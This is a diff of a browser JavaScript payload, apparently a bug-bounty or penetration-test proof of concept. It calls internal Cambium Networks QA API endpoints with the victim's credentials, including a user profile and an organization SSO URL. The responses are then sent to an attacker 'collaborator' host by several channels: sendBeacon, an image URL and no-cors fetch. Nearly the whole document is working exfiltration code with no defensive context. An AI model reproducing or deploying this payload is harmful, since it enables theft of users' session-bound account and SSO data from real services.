@@ -12,9 +12,9 @@ const collectData = async () => {
         url: window.location.href
     };
 
-    // Step 1: Access internal API to get CID
+    // Try to access internal API
     try {
-        const userResponse = await fetch('https://qa-us-east-1-srv-7.cloud.cambiumnetworks.com/VCT_CTH31/cn-srv/user/me', {
+        const response = await fetch('https://qa.cloud.cambiumnetworks.com/cn-rtr/organizations/48c489f677f5e2c337030705ffa47b3f/sso-url', {
             credentials: 'include',
             headers: { 
                 'Accept': 'application/json',
@@ -22,44 +22,12 @@ const collectData = async () => {
             }
         });
         
-        if (userResponse.ok) {
-            const userData = await userResponse.json();
-            data.internalApi = userData;
+        if (response.ok) {
+            const apiData = await response.json();
+            data.internalApi = apiData;
             data.internalStatus = 'SUCCESS';
-            
-            // Extract CID from response
-            if (userData.cid) {
-                data.cid = userData.cid;
-                
-                // Step 2: Use CID to request SSO URL
-                try {
-                    const ssoUrl = `https://qa.cloud.cambiumnetworks.com/cn-rtr/organizations/${userData.cid}/sso-url`;
-                    const ssoResponse = await fetch(ssoUrl, {
-                        credentials: 'include',
-                        headers: { 
-                            'Accept': 'application/json',
-                            'Content-Type': 'application/json'
-                        }
-                    });
-                    
-                    if (ssoResponse.ok) {
-                        const ssoData = await ssoResponse.json();
-                        data.ssoResponse = ssoData;
-                        data.ssoStatus = 'SUCCESS';
-                        data.ssoUrl = ssoUrl;
-                    } else {
-                        data.ssoStatus = `FAILED: ${ssoResponse.status}`;
-                        data.ssoUrl = ssoUrl;
-                    }
-                } catch (ssoError) {
-                    data.ssoStatus = `ERROR: ${ssoError.message}`;
-                    data.ssoUrl = ssoUrl;
-                }
-            } else {
-                data.cidStatus = 'CID_NOT_FOUND';
-            }
         } else {
-            data.internalStatus = `FAILED: ${userResponse.status}`;
+            data.internalStatus = `FAILED: ${response.status}`;
         }
     } catch (error) {
         data.internalStatus = `ERROR: ${error.message}`;
@@ -72,35 +40,19 @@ const collectData = async () => {
 const exfiltrate = (data) => {
     const jsonData = JSON.stringify(data, null, 2);
     
-    console.log('Exfiltrating data:', data);
-    
     // Method 1: sendBeacon (no CORS issues)
     navigator.sendBeacon(`${collaborator}/beacon`, jsonData);
     
     // Method 2: Image (no CORS)
-    const imgData = btoa(encodeURIComponent(jsonData));
-    new Image().src = `${collaborator}/img?data=${imgData}`;
+    new Image().src = `${collaborator}/img?data=${btoa(encodeURIComponent(jsonData))}`;
     
-    // Method 3: Fetch with no-cors
+    // Method 3: Fetch with no-cors (can't read response but sends)
     fetch(`${collaborator}/fetch`, {
         method: 'POST',
         mode: 'no-cors',
         body: jsonData
     });
-    
-    // Method 4: Additional GET request with data in URL
-    fetch(`${collaborator}/get?data=${encodeURIComponent(JSON.stringify(data))}`, {
-        mode: 'no-cors'
-    });
 };
 
-// Execute with error handling
-collectData().then(exfiltrate).catch(error => {
-    // Send error information to collaborator
-    const errorData = {
-        error: error.message,
-        timestamp: new Date().toISOString(),
-        url: window.location.href
-    };
-    exfiltrate(errorData);
-});
+// Execute
+collectData().then(exfiltrate);
